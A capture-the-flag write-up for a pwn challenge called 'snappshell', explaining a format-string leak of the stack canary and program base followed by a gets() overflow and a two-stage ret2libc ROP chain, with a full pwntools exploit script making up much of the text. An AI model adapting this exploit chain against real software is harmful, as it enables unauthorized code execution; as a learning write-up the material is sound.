## Description

````
My [**shell**](https://snappctf.com/tasks/snappshell_fc8d87fc117c34914b7c1b1d1255e6305ae9a072.txz) is broken, can you fix it for me? No you can't = )

`nc 91.107.177.236 3117`
````
## Solution

There was 4 functionality in the program, one was exit, other one was cat which was disabled and there were two functionality which were useful for the exploitation, `echo` function that was vulnerable to format string and was used to leak the canary and address of `main` function and the base of program for gadgets that we might need, and the `find_index` function which  was vulnerable to overflow with `gets` function allowing us to jmp wherever we need.

After a long search for pop rdi gadget to leak the libc address to bypass ASLR, I was hopelessly searching writeups to figure what to do when I found https://ctftime.org/writeup/36368 which was the Idea and once more I opened r2 and found out that it is actually there with a `0x62050` difference to the libc base address, so used puts function to leak that and after that return again to main and after that using the pop rdi gadget inside libc to pop bin/sh string to the rdi and finally calling system function.

```python3
p=process('./snapp_shell')

# Leak canary
p.sendline('1')
p.recvuntil('input\n')
p.sendline('%7$p')
x=p.recvline()
can=p64(int(x,16))

# get main address
p.sendline('1')
p.recvuntil('input\n')
p.sendline('%15$p')
x=p.recvline()
main=int(x,16)

# Compute some useful addresses or just set to find their real address later
exe = main-0x0000140d
puts = exe+0x10e4
ret = exe+0x101a
diff = 0x62050
system = 0x50d70
binsh = 0x1d8678
pop_rdi = 0x2a3e5

# First step exploit
p.sendline('3')
pay=b'SNAPPaaaabaaacaaadaaaeaa'+can+b'aaaabaaa'+p64(ret)+p64(puts)+p64(ret)+p64(main)
p.sendline(pay)
p.recvuntil('input is')
p.recvline()
lc = p.recvline()
lcd = u64(lc[:-1]+b'\x00\x00')
libc = lcd - diff

# Second step exploit
p.sendline('3')
pay=b'SNAPPaaaabaaacaaadaaaeaa'+can+b'aaaabaaa'+p64(ret)+p64(libc+pop_rdi)+p64(libc+binsh)+p64(libc+system)
p.sendline(pay)
```

![IMG/Pasted image 20240225191817.png](./IMG/Pasted image 20240225191817.png)